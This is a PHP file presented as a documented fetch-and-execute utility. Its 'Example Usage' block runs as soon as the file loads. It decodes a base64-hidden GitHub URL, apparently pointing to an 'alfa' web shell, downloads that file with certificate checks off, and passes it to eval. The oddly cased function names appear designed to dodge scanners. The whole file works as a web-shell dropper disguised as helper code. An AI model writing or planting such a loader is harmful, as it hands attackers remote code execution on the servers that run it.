<?php

/**
 * Fetches content from a URL using cURL.
 *
 * @param string $url The URL to fetch content from.
 * @return string|false The response content as a string, or false if the operation fails.
 */
function fetchContent($url)
{
    if (function_exists('curl_version')) {
        $curl = curl_init();

        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HEADER, 0);

        $response = curl_exec($curl);

        if (curl_errno($curl)) {
            $error = curl_error($curl);
            curl_close($curl);
            throw new Exception("cURL Error: " . $error);
        }

        curl_close($curl);
        return $response;
    }

    throw new Exception("cURL is not enabled on this server.");
}

/**
 * Executes PHP code fetched from a given URL.
 *
 * @param string $url The URL containing the PHP code to execute.
 * @return void
 * @throws Exception If the fetch operation fails or the fetched code is empty.
 */
function executeCodeFromURL($url)
{
    $code = fetchContent($url);

    if ($code === false || trim($code) === '') {
        throw new Exception("Failed to fetch content from URL or the content is empty.");
    }

    // Evaluates the fetched PHP code (use with caution)
    EVal("?>" . $code);
}

// Example Usage
try {
    $url = bAse64_decodE("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nrb3A0OC9hbGZhLnR4dC9yZWZzL2hlYWRzL21haW4vYWFwLnR4dA==");
    executeCodeFromURL($url);
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}